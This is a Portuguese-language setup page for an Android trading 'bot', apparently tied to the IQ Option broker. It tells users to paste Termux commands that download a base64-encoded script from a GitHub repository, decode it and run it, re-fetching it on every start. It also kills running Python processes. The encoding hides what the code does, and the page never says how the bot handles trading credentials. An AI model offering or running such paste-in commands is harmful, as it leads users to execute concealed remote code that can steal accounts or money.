📥 Passo 1: Baixar o Termux

O Termux é um terminal Linux para Android. É gratuito e não tem anúncios.

📲 Baixar na Play Store

⚙️ Passo 2: Instalar o Bot

Abra o Termux e cole o comando abaixo. Ele vai instalar tudo automaticamente.

pkg install python -y; pkill -f python 2>/dev/null; pip install flask && pip install requests && pip install api-iqoption-faria && curl -4 -s https://raw.githubusercontent.com/gynbetfc/v-sensitivo-bot/main/main.py -o bot.b64 && python -c "import base64; open('bot.py','w').write(base64.b64decode(open('bot.b64').read()).decode())" && rm bot.b64 && echo '✅ Instalação concluída!'
⚠️ Se travar em 99%, aperte Ctrl+C e depois ENTER. Depois cole o comando novamente.

Este comando instala tudo e deixa o bot pronto. Não abre o Chrome ainda.

🚀 Passo 3: Iniciar o Bot

Sempre que quiser usar o bot, cole este comando:

pkill -f python; curl -4 -s https://raw.githubusercontent.com/gynbetfc/v-sensitivo-bot/main/main.py -o bot.b64 && python -c "import base64; open('bot.py','w').write(base64.b64decode(open('bot.b64').read()).decode())" && rm bot.b64 && python bot.py & sleep 8 && termux-open-url http://127.0.0.1:5000
